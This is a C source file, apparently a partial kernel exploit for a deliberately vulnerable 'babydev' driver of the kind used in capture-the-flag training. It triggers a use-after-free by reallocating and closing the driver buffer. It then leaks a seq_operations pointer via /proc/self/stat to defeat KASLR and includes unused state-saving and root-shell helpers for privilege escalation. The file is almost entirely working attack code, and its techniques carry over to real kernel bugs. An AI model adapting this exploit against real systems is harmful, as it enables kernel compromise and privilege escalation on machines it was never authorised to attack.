#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <assert.h>

// Path
#define DEV_PATH "/dev/babydev"

// Constants
#define PAGE 0x1000
#define MMAP_SIZE 0xdead000

// shorts
#define ul unsigned long long
#define err(mssg) {perror(mssg);exit(-1);}

// Globals
ul user_cs, user_ss, user_rflags, user_sp;
ul current_size = 1<<31;
int stat_fd;
ul kern_base;

void pop_shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    execve("/bin/sh",argv,envp);
}
void save_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved State");
}
int devopen()
{
    int _fd = open(DEV_PATH,O_RDWR);
    assert(_fd>0);
    return _fd;
}
void devwrite(int fd,char *buf,size_t size)
{
    assert(write(fd,buf,size)>=0);
}
void devrealloc(int fd,size_t size)
{
    assert(ioctl(fd,0x10001,size) == 0);
}
void devclose(int fd)
{
    assert(close(fd) >= 0);
}
void devread(int fd,char *buf,size_t size)
{
    assert(read(fd,buf,size));
}
int main()
{
    char stack_buf[0x2000];
    int fd_arr[0x10];
    fd_arr[0] = devopen();
    printf("[*] Opened %s on FD: %d\n",DEV_PATH,fd_arr[0]);
    fd_arr[1] = devopen();
    printf("[*] Opened %s again on FD: %d\n",DEV_PATH,fd_arr[1]);
    
    devrealloc(fd_arr[0],0x20);
    puts("[*] Reallocated Driver Buffer to Size 0x20");
    devclose(fd_arr[0]);
    puts("[*] Closed one instance of driver");

    stat_fd = open("/proc/self/stat",O_RDONLY);
    printf("[*] Opened /proc/self/stat on FD: %d\n",stat_fd);
    assert(stat_fd > 0);

    devread(fd_arr[1],stack_buf,0x10);
    puts("[*] Reading seq_operations using UAF");
    ul kernel_leak = ((ul *)stack_buf)[0];
    printf("[!] Kernel Leak: 0x%llx\n",kernel_leak);

    kern_base = kernel_leak - 0x22f4d0;
    printf("[!] Kernel Text Base: 0x%llx\n",kern_base);
    return 0;
}